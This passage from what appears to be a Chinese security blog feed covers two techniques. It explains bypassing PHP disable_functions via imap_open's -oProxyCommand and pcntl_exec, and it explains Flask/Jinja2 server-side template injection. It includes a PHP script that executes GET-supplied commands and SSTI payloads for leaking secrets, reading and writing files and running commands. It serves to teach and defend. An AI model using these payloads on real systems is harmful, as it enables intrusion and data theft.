的imap_open函数中的漏洞可能允许经过身份验证的远程攻击者在目标系统上执行任意命令。该漏洞的存在是因为受影响的软件的imap_open函数在将邮箱名称传递给rsh或ssh命令之前不正确地过滤邮箱名称。如果启用了rsh和ssh功能并且rsh命令是ssh命令的符号链接，则攻击者可以通过向目标系统发送包含-oProxyCommand参数的恶意IMAP服务器名称来利用此漏洞。成功的攻击可能允许攻击者绕过其他禁用的exec 受影响软件中的功能，攻击者可利用这些功能在目标系统上执行任意shell命令。利用此漏洞的功能代码是Metasploit Framework的一部分。</p></blockquote><h4 id="imap-open"><a href="#imap-open" class="headerlink" title="imap_open()"></a>imap_open()</h4><p>imap_open()函数定义如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">resource imap_open ( string $mailbox , string $username , string $password [, int $options = <span class="number">0</span> [, int $n_retries = <span class="number">0</span> [, <span class="keyword">array</span> $params = <span class="keyword">NULL</span> ]]] )</span><br></pre></td></tr></table></figure><p>mailbox参数的值由服务器名和服务器上的mailbox文件路径所组成，INBOX代表的是当前用户的个人邮箱。比如，我们可以通过如下方式来设置mailbox参数：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$mbox = imap_open (<span class="string">"&#123;localhost:993/PROTOCOL/FLAG&#125;INBOX"</span>, <span class="string">"user_id"</span>, <span class="string">"password"</span>);</span><br></pre></td></tr></table></figure><p>在括号内的字符串中，我们可以看到服务器名称（或者IP地址）、端口号以及协议名称。用户可以在协议名后设置标志（第3个参数）。</p><p>在PHP官方文档中，关于imap_open参数的设置有如下一段警告内容：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/14.png" alt=""></p><p>根据警告信息，除非我们禁用了enable_insecure_rsh选项，否则不要将用户数据直接传输到mailbox参数中。</p><p>为什么官方文档会有这个警告信息呢？</p><p><strong>简单地说，就是imap_open()函数会调用到rsh的程序，而该程序中会调用execve系统调用来实现rsh的调用，其中的邮件地址参数是由imap_open()函数的mailbox参数传入，同时，由于rsh命令是ssh命令的符号链接，所以当我们利用ssh的-oProxyCommand参数来构造恶意mailbox参数时就能执行恶意命令。</strong></p><p>具体分析过程请参考<a href="https://xz.aliyun.com/t/4113" target="_blank" rel="noopener">《如何在PHP安装中绕过disable_functions》</a>。</p><h4 id="oProxyCommand参数"><a href="#oProxyCommand参数" class="headerlink" title="-oProxyCommand参数"></a>-oProxyCommand参数</h4><p>ProxyCommand指定用于连接服务器的命令。</p><p>当我们执行以下这条命令时，可以发现即便我们没有建立与localhost的SSH连接，也会创建mi1k7ea文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@sq:/var/www/html<span class="comment"># ssh -oProxyCommand="touch mi1k7ea" localhost</span></span><br><span class="line">ssh_exchange_identification: Connection closed by remote host</span><br><span class="line">root@sq:/var/www/html<span class="comment"># ls | grep mi1k7ea</span></span><br><span class="line">mi1k7ea</span><br></pre></td></tr></table></figure><p>至此，就知道了可以通过-oProxyCommand参数来执行系统命令。</p><p>但是我们不能直接将上述命令直接转移到PHP脚本来代替imap_open服务器地址，因为在解析时它会将空格解释为分隔符和斜杠作为标志。但是我们可以使用\$IFS这个shell变量来替换空格符号或使用\t替换。还可以在bash中使用Ctrl + V热键和Tab键插入标签。要想绕过斜杠，可以使用base64编码和相关命令对其进行解码。</p><h3 id="Bypass-2"><a href="#Bypass-2" class="headerlink" title="Bypass"></a>Bypass</h3><p>exp如下，先判断是否存在imap_open()函数，然后构造exp执行通过外部GET输入的命令然后保存结果到本地文件中，最后输出结果文件内容，注意sleep(5)是为了等imap_open()函数执行完、因为该函数执行时需要DNS轮询会存在延时：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (!function_exists(<span class="string">'imap_open'</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"no imap_open function!"</span>);</span><br><span class="line">&#125;</span><br><span class="line">$server = <span class="string">"x -oProxyCommand=echo\t"</span> . base64_encode($_GET[<span class="string">'cmd'</span>] . <span class="string">"&gt;/tmp/cmd_result"</span>) . <span class="string">"|base64\t-d|sh&#125;"</span>;</span><br><span class="line"><span class="comment">//$server = 'x -oProxyCommand=echo$IFS$()' . base64_encode($_GET['cmd'] . "&gt;/tmp/cmd_result") . '|base64$IFS$()-d|sh&#125;';</span></span><br><span class="line">imap_open(<span class="string">'&#123;'</span> . $server . <span class="string">':143/imap&#125;INBOX'</span>, <span class="string">''</span>, <span class="string">''</span>); <span class="comment">// or var_dump("\n\nError: ".imap_last_error());</span></span><br><span class="line">sleep(<span class="number">5</span>);</span><br><span class="line"><span class="keyword">echo</span> file_get_contents(<span class="string">"/tmp/cmd_result"</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>当然，替换空格符的\t也可以换成<code>$IFS$()</code>来Bypass掉。</p><p>此时环境中disable_functions配置如下：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/12.png" alt=""></p><p>访问，能够成功Bypass：</p><p><img src="/2019/06/02/浅谈几种Bypass-disable-functions的方法/13.png" alt=""></p><h3 id="防御方法-2"><a href="#防御方法-2" class="headerlink" title="防御方法"></a>防御方法</h3><ul><li>设置imap.enable_insecure_rsh选项为Off；</li><li>可以的话禁用imap_open()函数；</li></ul><h2 id="0x08-利用pcntl插件绕过"><a href="#0x08-利用pcntl插件绕过" class="headerlink" title="0x08 利用pcntl插件绕过"></a>0x08 利用pcntl插件绕过</h2><h3 id="前提条件-1"><a href="#前提条件-1" class="headerlink" title="前提条件"></a>前提条件</h3><p>前提是PHP安装并启用了pcntl插件。</p><h3 id="基本原理-4"><a href="#基本原理-4" class="headerlink" title="基本原理"></a>基本原理</h3><p>原理比较简单，就是利用pcntl_exec()这个pcntl插件专有的命令执行函数来执行系统命令，从而Bypass黑名单。</p><h3 id="Bypass-3"><a href="#Bypass-3" class="headerlink" title="Bypass"></a>Bypass</h3><p>这里直接贴exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">#exec.php</span><br><span class="line">&lt;?php pcntl_exec(&quot;/bin/bash&quot;, array(&quot;/tmp/b4dboy.sh&quot;));?&gt;</span><br><span class="line">#/tmp/b4dboy.sh</span><br><span class="line">#!/bin/bash</span><br><span class="line">ls -l /</span><br></pre></td></tr></table></figure><h3 id="防御方法-3"><a href="#防御方法-3" class="headerlink" title="防御方法"></a>防御方法</h3><p>disable_functions的黑名单中添加pcntl相关函数实现禁用。</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.freebuf.com/web/192052.html" target="_blank" rel="noopener">无需 sendmail：巧用 LD_PRELOAD 突破 disable_functions</a></p><p><a href="http://blog.leanote.com/post/xuxi/PHP-Webshell%E4%B8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E9%99%90%E5%88%B6%E5%8F%8A%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95" target="_blank" rel="noopener">PHP Webshell下命令执行限制及绕过disable_function方法总结</a></p><p><a href="https://www.leavesongs.com/PHP/php-bypass-disable-functions-by-CVE-2014-6271.html" target="_blank" rel="noopener">PHP Execute Command Bypass Disable_functions</a></p><p><a href="https://www.cnblogs.com/hookjoy/p/8988862.html" target="_blank" rel="noopener">PHP中通过bypass disable functions执行系统命令的几种方式</a></p><p><a href="https://xz.aliyun.com/t/4113" target="_blank" rel="noopener">如何在PHP安装中绕过disable_functions</a></p>]]></content>
    
    <summary type="html">
    
      未完待续...
    
    </summary>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/categories/PHP/"/>
    
    
      <category term="Web安全" scheme="https://Mi1k7ea.github.com/tags/Web%E5%AE%89%E5%85%A8/"/>
    
      <category term="PHP" scheme="https://Mi1k7ea.github.com/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>浅析Python Flask SSTI</title>
    <link href="https://Mi1k7ea.github.com/2019/06/02/%E6%B5%85%E6%9E%90Python-Flask-SSTI/"/>
    <id>https://Mi1k7ea.github.com/2019/06/02/浅析Python-Flask-SSTI/</id>
    <published>2019-06-02T03:18:04.000Z</published>
    <updated>2019-06-02T10:01:47.981Z</updated>
    
    <content type="html"><![CDATA[<h2 id="0x01-SSTI"><a href="#0x01-SSTI" class="headerlink" title="0x01 SSTI"></a>0x01 SSTI</h2><p>SSTI(Server-Side Template Injection)，即服务端模板注入攻击，通过与服务端模板的输入输出交互，在过滤不严格的情况下，构造恶意输入数据，从而达到读取文件或者getshell的目的。</p><p>通常在CTF中多是以Python的Flask框架结合Jinja2的形式出现。</p><h2 id="0x02-背景知识"><a href="#0x02-背景知识" class="headerlink" title="0x02 背景知识"></a>0x02 背景知识</h2><h3 id="Flask"><a href="#Flask" class="headerlink" title="Flask"></a>Flask</h3><p>Flask是一个使用Python编写的轻量级Web应用框架。其 WSGI 工具箱采用Werkzeug，模板引擎则使用Jinja2。</p><h3 id="Jinja2"><a href="#Jinja2" class="headerlink" title="Jinja2"></a>Jinja2</h3><p>Jinja2是Flask作者开发的一个模板系统，起初是仿django模板的一个模板引擎，为Flask提供模板支持，由于其灵活，快速和安全等优点被广泛使用。</p><p>在Jinja2中，存在三种语句：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">控制结构 &#123;% %&#125;</span><br><span class="line">变量取值 &#123;&#123; &#125;&#125;</span><br><span class="line">注释 &#123;# #&#125;</span><br></pre></td></tr></table></figure><p>Jinja2模板中使用上述第二种的语法表示一个变量，它是一种特殊的占位符。当利用Jinja2进行渲染的时候，它会把这些特殊的占位符进行填充/替换，Jinja2支持Python中所有的Python数据类型比如列表、字段、对象等。被两个括号包裹的内容会输出其表达式的值。</p><p>Jinja2中的过滤器可以理解为是Jinja2里面的内置函数和字符串处理函数。</p><h3 id="模板渲染函数"><a href="#模板渲染函数" class="headerlink" title="模板渲染函数"></a>模板渲染函数</h3><h4 id="render-template"><a href="#render-template" class="headerlink" title="render_template()"></a>render_template()</h4><p>使用render_template()方法可以渲染模板，你只要提供模板名称和需要作为参数传递给模板的变量就行了。</p><p>渲染过程如下，render_template()函数的第一个参数为渲染的目标html页面、第二个参数为需要加载到页面指定标签位置的内容，来自网上摘的一个图：</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/1.png" alt=""></p><p>其实render_template()的功能是先引入home.html，同时根据后面传入的参数，对html进行修改渲染。</p><p>注意：当在HTML模板中在标签内传入的内容是通过如<code></code>而非%s这种传参形式时，HTML自动转义默认开启。因此，如果 name 包含 HTML ，那么会被自动转义。</p><p>这里我们搭个简单的Demo瞧瞧：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request, render_template_string, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_ssti</span><span class="params">()</span>:</span></span><br><span class="line">    person = &#123;</span><br><span class="line">        <span class="string">'name'</span>: <span class="string">'hello'</span>,</span><br><span class="line">        <span class="string">'secret'</span>: <span class="string">'This_is_my_secret'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">'name'</span>):</span><br><span class="line">        person[<span class="string">'name'</span>] = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">"index.html"</span>, person=person)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>然后在当前目录新建templates目录，在其中新建index.html：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h2</span>&gt;</span>Hello &#123;&#123; person.name &#125;&#125;!<span class="tag">&lt;/<span class="name">h2</span>&gt;</span></span><br></pre></td></tr></table></figure><p>开启Flask服务，访问输入参数name，在页面会直接显示出来：</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/2.png" alt=""></p><p>当尝试进行XSS时，会自动被HTML编码过滤：</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/3.png" alt=""></p><h4 id="render-template-string"><a href="#render-template-string" class="headerlink" title="render_template_string()"></a>render_template_string()</h4><p>这个函数作用和前面的类似，顾名思义，区别在于只是第一个参数并非是文件名而是字符串。<strong>也就是说，我们不需要再在templates目录中新建HTML文件了，而是可以直接将HTML代码写到一个字符串中，然后使用该函数渲染该字符串中的HTML代码到页面即可</strong>。</p><p>基于前面修改的Demo如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request, render_template_string, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_ssti</span><span class="params">()</span>:</span></span><br><span class="line">    person = &#123;</span><br><span class="line">        <span class="string">'name'</span>: <span class="string">'hello'</span>,</span><br><span class="line">        <span class="string">'secret'</span>: <span class="string">'This_is_my_secret'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">'name'</span>):</span><br><span class="line">        person[<span class="string">'name'</span>] = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    template = <span class="string">'&lt;h2&gt;Hello &#123;&#123; person.name &#125;&#125;!&lt;/h2&gt;'</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, person=person)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>访问的结果和前面的一样，而且也是自动进行了HTML实体编码。</p><h2 id="0x03-漏洞点"><a href="#0x03-漏洞点" class="headerlink" title="0x03 漏洞点"></a>0x03 漏洞点</h2><p>前面简单说了下两个模板渲染函数的原理，那么漏洞点在哪里呢？</p><p>由前面知道，要想实现模板注入，首先必须得注入模板执行语句，如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">控制结构 &#123;% %&#125;</span><br><span class="line">变量取值 &#123;&#123; &#125;&#125;</span><br></pre></td></tr></table></figure><p>但是在前面两个函数的Demo中，html内容中是以<code></code>这种变量取值语句的形式来处理传入的参数的，此时person.name的值无论是什么内容，都会被当作是字符串来进行处理而非模板语句来执行，比如即使传入的是config来构成<code></code>，但其也只会把参数值当作是字符串而非模板语句：</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/4.png" alt=""></p><p>既然这样，要想整个参数输入的内容被当成是模板语句来执行，就只能是通过%s这种传参形式来实现了，修改的Demo如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> request, render_template_string, render_template</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/login')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hello_ssti</span><span class="params">()</span>:</span></span><br><span class="line">    person = &#123;</span><br><span class="line">        <span class="string">'name'</span>: <span class="string">'hello'</span>,</span><br><span class="line">        <span class="string">'secret'</span>: <span class="string">'This_is_my_secret'</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">'name'</span>):</span><br><span class="line">        person[<span class="string">'name'</span>] = request.args.get(<span class="string">'name'</span>)</span><br><span class="line">    <span class="comment"># changed</span></span><br><span class="line">    template = <span class="string">'&lt;h2&gt;Hello %s!&lt;/h2&gt;'</span> % person[<span class="string">'name'</span>]</span><br><span class="line">    <span class="keyword">return</span> render_template_string(template, person=person)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(debug=<span class="keyword">True</span>)</span><br></pre></td></tr></table></figure><p>此时将<code></code>换成了%s，通过传入字符串的方式传入内容，当传入恶意构造的模板语句时就会造成SSTI。</p><p>验证漏洞，传入模板变量语句<code>3</code>，注意加号要URL编码，当看到返回3时证明语句成功注入执行了：</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/5.png" alt=""></p><p>这里就能得出结论了：</p><ul><li>SSTI漏洞点为在render_template_string()函数中，作为模板的字符串参数中的传入参数是通过%s的形式获取而非变量取值语句的形式获取，从而导致攻击者通过构造恶意的模板语句来注入到模板中、模板解析执行了模板语句从而实现SSTI攻击；</li><li>SSTI漏洞风险只出现在render_template_string()函数，而render_template()函数并不存在SSTI风险，因为render_template()函数中是传入到一个模板HTML文件中，而该html文件这种的变量取值语句实现不了修改成%s这种形式的；</li></ul><h2 id="0x04-漏洞利用"><a href="#0x04-漏洞利用" class="headerlink" title="0x04 漏洞利用"></a>0x04 漏洞利用</h2><p>这里Demo就拿上一小节的就好。</p><h3 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h3><p>传入什么返回什么，第一时间想到的就是XSS。之前的变量取值语句传入时是会进行自动HTML编码的，但%s传入的参数是不会自动进行HTML编码的，因为Flask并没有将整个内容视为字符串。</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/6.png" alt=""></p><h3 id="敏感信息泄露"><a href="#敏感信息泄露" class="headerlink" title="敏感信息泄露"></a>敏感信息泄露</h3><p>访问对应的全局变量即可直接泄露出配置文件的内容。</p><p>比如config变量：</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/7.png" alt=""></p><p>还有Demo中secret变量：</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/8.png" alt=""></p><p>某些情况下，当获取secret_key后，即可对session进行重新签名，完成session的伪造。</p><p>注意：Flask的session是保存在客户端，称为客户端session，会进行编码和校验。</p><p>整合一下可利用的PoC技巧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config&#125;&#125;</span><br><span class="line">?name=&#123;&#123;person.secret&#125;&#125;</span><br><span class="line">?name=&#123;&#123;self.__dict__&#125;&#125;</span><br><span class="line">?name=&#123;&#123;url_for.__globals__[&apos;current_app&apos;].config&#125;&#125;</span><br><span class="line">?name=&#123;&#123;get_flashed_messages.__globals__[&apos;current_app&apos;].config&#125;&#125;</span><br></pre></td></tr></table></figure><h3 id="读写文件"><a href="#读写文件" class="headerlink" title="读写文件"></a>读写文件</h3><p>这里需要用到Python沙箱逃逸的元素链，这里直接给出payload，具体构造过程可参考<a href="https://www.mi1k7ea.com/2019/05/31/Python沙箱逃逸小结/" target="_blank" rel="noopener">《Python沙箱逃逸小结》</a>。</p><p><strong>读文件</strong></p><p>这里只给个演示的poc，其他绕过类的poc参考<a href="https://www.mi1k7ea.com/2019/05/31/Python沙箱逃逸小结/" target="_blank" rel="noopener">《Python沙箱逃逸小结》</a>构造即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Python2</span><br><span class="line">?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;E:/passwd&apos;).read()&#125;&#125;</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;E:/passwd&apos;).read()</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;E:/passwd&apos;).read()</span><br><span class="line"></span><br><span class="line"># Python3中无file，只能用open</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;open&apos;](&apos;E:/passwd&apos;).read()</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/9.png" alt=""></p><p><strong>写文件</strong></p><p>这里只给个演示的poc，其他绕过类的poc参考<a href="https://www.mi1k7ea.com/2019/05/31/Python沙箱逃逸小结/" target="_blank" rel="noopener">《Python沙箱逃逸小结》</a>构造即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># Python2</span><br><span class="line">?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;E:/m7.txt&apos;,&apos;w&apos;).write(&apos;Mi1k7ea&apos;)&#125;&#125;</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;E:/passwd&apos;,&apos;w&apos;).write(&apos;Mi1k7ea&apos;)</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;E:/passwd&apos;,&apos;w&apos;).write(&apos;Mi1k7ea&apos;)</span><br><span class="line"></span><br><span class="line"># Python3中无file，只能用open</span><br><span class="line">&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;file&apos;](&apos;E:/passwd&apos;,&apos;w&apos;).write(&apos;Mi1k7ea&apos;)</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/10.png" alt=""></p><h3 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h3><p>命令执行才是SSTI的重点，主要分为两种形式。</p><h4 id="利用from-pyfile加载对象到Flask配置环境"><a href="#利用from-pyfile加载对象到Flask配置环境" class="headerlink" title="利用from_pyfile加载对象到Flask配置环境"></a>利用from_pyfile加载对象到Flask配置环境</h4><p>这种利用方式算是一种简单的漏洞组合拳。</p><p>先利用文件写入漏洞写一个Python文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[40](&apos;E:/m7.py&apos;,&apos;w&apos;).write(&apos;from subprocess import check_output\nRUNCMD=check_output\n&apos;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/11.png" alt=""></p><p>然后使用config.from_pyfile将该Python文件加载到config变量中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config.from_pyfile(&apos;E:/m7.py&apos;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/12.png" alt=""></p><p>访问全局变量config查看是否加载成功：</p><p><img src="/2019/06/02/浅析Python-Flask-SSTI/13.png" alt=""></p><p>加载成功后，就可以通过以下形式执行任意命令了：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;config[&apos;RUNCMD&apos;](&apos;whoami&apos;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/14.png" alt=""></p><p>可知，这种利用方式是直接有回显的。</p><h4 id="利用元素链中可利用的命令执行函数"><a href="#利用元素链中可利用的命令执行函数" class="headerlink" title="利用元素链中可利用的命令执行函数"></a>利用元素链中可利用的命令执行函数</h4><p>元素链的payload就很多，具体看<a href="https://www.mi1k7ea.com/2019/05/31/Python沙箱逃逸小结/" target="_blank" rel="noopener">《Python沙箱逃逸小结》</a>来进行各种payload的构造就好，这里只给出几个简单的示例：</p><p>os.system()的利用是无回显的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].system(&apos;calc&apos;)&#125;&#125;</span><br></pre></td></tr></table></figure><p><img src="/2019/06/02/浅析Python-Flask-SSTI/15.png" alt=""></p><p>要想有回显，可利用如下几个：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"># os.popen(cmd).read()</span><br><span class="line">?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;linecache&apos;].__dict__[&apos;os&apos;].popen(&apos;whoami&apos;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"># platform.popen(cmd).read()</span><br><span class="line">?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;platform&apos;).popen(&apos;whoami&apos;).read()&#125;&#125;</span><br><span class="line"></span><br><span class="line"># sys.modules间接调用前面两个模块</span><br><span class="line">?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;sys&apos;).modules[&apos;os&apos;].popen(&apos;whoami&apos;).read()&#125;&#125;</span><br><span class="line">?name=&#123;&#123;&apos;&apos;.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__[&apos;__builtins__&apos;][&apos;__import__&apos;](&apos;sys&apos;).modules[&apos;platform&apos;].popen(&apos;whoami&apos;).read()&#125;&#125;</span><br></pre></td></tr></table></figure><p>更多的变形技巧参考<a href="https://www.mi1k7ea.com/2019/05/31/Python沙箱逃逸小结/" target="_blank" rel="noopener">《Python沙箱逃逸小结》</a>。</p><p><strong>控制结构</strong></p><p>当然，前面的利用都是基于Jinja2的变量取值语句，除此之外我们也可以利用控制结构来实现利用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 命令执行</span><br><span class="line">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].eval(&quot;__import__(&apos;os&apos;).popen(&apos;whoami&apos;).read()&quot;) &#125;&#125;&#123;% endif %&#125;&#123;% endfor %&#125;</span><br><span class="line"></span><br><span class="line"># 文件操作</span><br><span class="line">?name=&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;&#123;% if c.__name__==&apos;catch_warnings&apos; %&#125;&#123;&#123; c.__init__.__globals__[&apos;__builtins__&apos;].open(&apos;E:/passwd&apos;, &apos;r&apos;).read() &#125;&#125;&#123;% endif %&#125;&#123;% endfor 